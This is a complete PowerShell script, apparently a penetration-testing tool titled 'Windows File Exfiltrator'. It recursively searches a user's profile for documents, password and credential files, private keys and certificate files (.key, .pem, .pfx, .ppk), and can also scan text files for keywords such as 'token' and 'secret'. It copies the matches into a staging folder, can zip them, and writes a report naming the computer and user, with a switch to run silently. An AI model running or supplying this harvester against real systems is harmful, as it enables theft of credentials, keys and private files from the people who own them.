# Windows File Exfiltrator - Native PowerShell
# No Python Required - For authorized penetration testing only

param(
    [string]$SearchPath = "$env:USERPROFILE",
    [string]$OutputDir = ".\exfiltrated_data",
    [string[]]$FileTypes = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*password*", "*credential*", "*.key", "*.pem", "*.pfx", "*.ppk"),
    [int]$MaxSizeMB = 50,
    [int]$MaxFiles = 500,
    [switch]$CreateArchive,
    [switch]$SearchContent,
    [string[]]$Keywords = @("password", "credential", "secret", "token", "api", "key"),
    [switch]$Silent
)

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[*] $Message"
    }
}

Write-Log "Windows PowerShell File Exfiltrator"
Write-Log "Search Path: $SearchPath"
Write-Log "Output Directory: $OutputDir"
Write-Log "Max File Size: $MaxSizeMB MB"
Write-Log "Max Files: $MaxFiles"
Write-Log "="*50

# Create output directory
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# Create report file
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$reportFile = Join-Path $OutputDir "exfiltration_report_$timestamp.txt"

$header = @"
File Exfiltration Report
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Search Path: $SearchPath
File Types: $($FileTypes -join ', ')
Max Size: $MaxSizeMB MB per file
Max Files: $MaxFiles
$("="*70)

"@

Set-Content -Path $reportFile -Value $header

# Function to check file content for keywords
function Test-FileContent {
    param(
        [string]$FilePath,
        [string[]]$Keywords
    )
    
    try {
        # Only search text-based files
        $textExtensions = @('.txt', '.log', '.xml', '.json', '.yml', '.yaml', '.ini', '.conf', '.config', '.env', '.ps1', '.bat', '.cmd')
        $extension = [System.IO.Path]::GetExtension($FilePath).ToLower()
        
        if ($textExtensions -contains $extension) {
            $content = Get-Content -Path $FilePath -ErrorAction SilentlyContinue -Raw
            foreach ($keyword in $Keywords) {
                if ($content -match $keyword) {
                    return $true
                }
            }
        }
    }
    catch { }
    
    return $false
}

# Function to safely copy file
function Copy-FileSecure {
    param(
        [string]$Source,
        [string]$Destination
    )
    
    try {
        $destDir = Split-Path -Parent $Destination
        if (-not (Test-Path $destDir)) {
            New-Item -ItemType Directory -Force -Path $destDir | Out-Null
        }
        
        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
        return $true
    }
    catch {
        Write-Log "  [!] Failed to copy: $Source"
        return $false
    }
}

Write-Log "Searching for files..."

# Search for files
$filesFound = @()
$totalSize = 0
$fileCount = 0

foreach ($pattern in $FileTypes) {
    Write-Log "Searching for: $pattern"
    
    try {
        Get-ChildItem -Path $SearchPath -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            if ($fileCount -ge $MaxFiles) {
                return
            }
            
            $file = $_
            $fileSizeMB = $file.Length / 1MB
            
            # Check size limit
            if ($fileSizeMB -le $MaxSizeMB) {
                $shouldInclude = $true
                
                # Check content if enabled
                if ($SearchContent) {
                    $shouldInclude = Test-FileContent -FilePath $file.FullName -Keywords $Keywords
                }
                
                if ($shouldInclude) {
                    $filesFound += $file
                    $totalSize += $file.Length
                    $fileCount++
                    
                    Write-Log "  Found: $($file.Name) ($([math]::Round($fileSizeMB, 2)) MB)"
                }
            }
        }
    }
    catch {
        Write-Log "  [!] Error searching for $pattern : $_"
    }
}

Write-Log "Found $($filesFound.Count) matching files"
Write-Log "Total size: $([math]::Round($totalSize / 1MB, 2)) MB"

# Copy files
Write-Log "Copying files to output directory..."

$copiedCount = 0
foreach ($file in $filesFound) {
    # Create directory structure in output
    $relativePath = $file.FullName.Substring($SearchPath.Length).TrimStart('\', '/')
    $destPath = Join-Path $OutputDir $relativePath
    
    if (Copy-FileSecure -Source $file.FullName -Destination $destPath) {
        $copiedCount++
        
        # Log to report
        $fileInfo = @"
File: $($file.Name)
Original Path: $($file.FullName)
Size: $([math]::Round($file.Length / 1KB, 2)) KB
Created: $($file.CreationTime)
Modified: $($file.LastWriteTime)

"@
        Add-Content -Path $reportFile -Value $fileInfo
    }
}

Write-Log "Copied $copiedCount files"

# Create archive if requested
if ($CreateArchive) {
    Write-Log "Creating archive..."
    
    $archiveName = "exfiltrated_data_$timestamp.zip"
    $archivePath = Join-Path (Split-Path $OutputDir -Parent) $archiveName
    
    try {
        # Compress the output directory
        Compress-Archive -Path "$OutputDir\*" -DestinationPath $archivePath -Force
        
        $archiveSize = (Get-Item $archivePath).Length / 1MB
        Write-Log "Archive created: $archivePath ($([math]::Round($archiveSize, 2)) MB)"
        
        Add-Content -Path $reportFile -Value "`nArchive: $archivePath"
        Add-Content -Path $reportFile -Value "Archive Size: $([math]::Round($archiveSize, 2)) MB"
    }
    catch {
        Write-Log "[!] Failed to create archive: $_"
    }
}

# Summary
$summary = @"

$("="*70)
SUMMARY
$("="*70)
Files Found: $($filesFound.Count)
Files Copied: $copiedCount
Total Size: $([math]::Round($totalSize / 1MB, 2)) MB
Output Directory: $OutputDir
"@

if ($CreateArchive -and (Test-Path $archivePath)) {
    $summary += "`nArchive: $archivePath"
}

Add-Content -Path $reportFile -Value $summary

Write-Log "`nExfiltration complete!"
Write-Log "Report: $reportFile"

# Display summary
if (-not $Silent) {
    Write-Host "`n[+] Exfiltration Summary:" -ForegroundColor Green
    Write-Host "  Files Found: $($filesFound.Count)" -ForegroundColor Cyan
    Write-Host "  Files Copied: $copiedCount" -ForegroundColor Cyan
    Write-Host "  Total Size: $([math]::Round($totalSize / 1MB, 2)) MB" -ForegroundColor Cyan
    Write-Host "  Output: $OutputDir" -ForegroundColor Cyan
    
    if ($CreateArchive -and (Test-Path $archivePath)) {
        Write-Host "  Archive: $archivePath" -ForegroundColor Cyan
    }
    
    # Show file type breakdown
    Write-Host "`n  File Type Breakdown:" -ForegroundColor Yellow
    $filesFound | Group-Object Extension | Sort-Object Count -Descending | ForEach-Object {
        Write-Host "    $($_.Name): $($_.Count) files" -ForegroundColor White
    }
    
    # Show largest files
    Write-Host "`n  Largest Files:" -ForegroundColor Yellow
    $filesFound | Sort-Object Length -Descending | Select-Object -First 5 | ForEach-Object {
        Write-Host "    $($_.Name) - $([math]::Round($_.Length / 1MB, 2)) MB" -ForegroundColor White
    }
}
